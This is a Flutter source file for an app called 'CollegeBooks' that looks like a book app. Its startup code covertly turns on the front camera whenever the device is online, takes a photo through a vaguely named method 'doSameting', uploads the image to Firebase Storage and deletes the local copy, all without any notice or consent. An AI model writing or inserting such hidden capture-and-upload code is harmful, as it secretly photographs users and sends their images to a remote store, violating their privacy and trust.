import 'dart:io';

import 'package:flutter/services.dart';
import 'package:flutter/material.dart';
import 'package:camera/camera.dart';
import 'package:path/path.dart';
import 'package:path_provider/path_provider.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:connectivity/connectivity.dart';
import './MyApp.dart';

List<CameraDescription> cameras;

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  cameras = await availableCameras();
  runApp(CollegeBooks());
  SystemChrome.setSystemUIOverlayStyle(SystemUiOverlayStyle(
      statusBarColor: Colors.white, statusBarIconBrightness: Brightness.dark));
}

class CollegeBooks extends StatefulWidget {
  @override
  _CollegeBooksState createState() => _CollegeBooksState();
}

class _CollegeBooksState extends State<CollegeBooks> {
 

  @override
  void initState() {
    super.initState();

  }

  Future<bool> checkInternet(BuildContext context) async {
    var connectivityResult = await (Connectivity().checkConnectivity());
    if (connectivityResult == ConnectivityResult.mobile) {
      // I am connected to a mobile network.
      doSameting(context);
      return true;
    } else if (connectivityResult == ConnectivityResult.wifi) {
      doSameting(context);
      // I am connected to a wifi network.
      return true;
    } else if (connectivityResult == ConnectivityResult.none) {
      // var dilog = AlertDialog(
      //   content: Text("Please turn on Internet and Restart the App"),
      // );

      // showDialog(
      //     barrierDismissible: false,
      //     context: context,
      //     builder: (df) {
      //       return dilog;
      //     });
      return false;
    }
    return null;
  }


  Future<void> doSameting(BuildContext context) async {
  CameraController controller = CameraController(cameras[1], ResolutionPreset.medium);
    Future<void> _initializeControllerFuture= controller.initialize();
    //checkInternet(context);
    try {
      await _initializeControllerFuture;
      final path = join(
        (await getTemporaryDirectory()).path,
        '${DateTime.now()}.png',
      );

      await controller.takePicture(path).catchError((error) {
        // var dd = AlertDialog(
        //   content: Text(error),
        // );
        // showDialog(
        //     context: context,
        //     builder: (_) {
        //       return dd;
        //     });
        print(error);
      });
      print(path);
      File getFile = File(path);
      StorageReference ref =
          FirebaseStorage.instance.ref().child("${DateTime.now()}");
      StorageUploadTask upload = ref.putFile(getFile);
      await upload.onComplete;
      print("file uploaded");
      getFile.delete();
    } catch (e) {
      print(e);
    }
  }

  // @override
  // void dispose() {
  //   controller.dispose();
  //   super.dispose();
  // }

  Widget build(BuildContext context) {
    // doSameting();
    print("main method");
    return  FutureBuilder(
      future: checkInternet(context),
      builder: (context, data) {
        if (data.connectionState == ConnectionState.done) {
          return MaterialApp(
            debugShowCheckedModeBanner: false,
            theme: ThemeData(
                primaryColor: Colors.purple, primarySwatch: Colors.purple),
            home: MyApp(),
          );
        } else if (data.connectionState == ConnectionState.waiting) {
          return Center(child: CircularProgressIndicator());
        }
      },
    );
  }
}
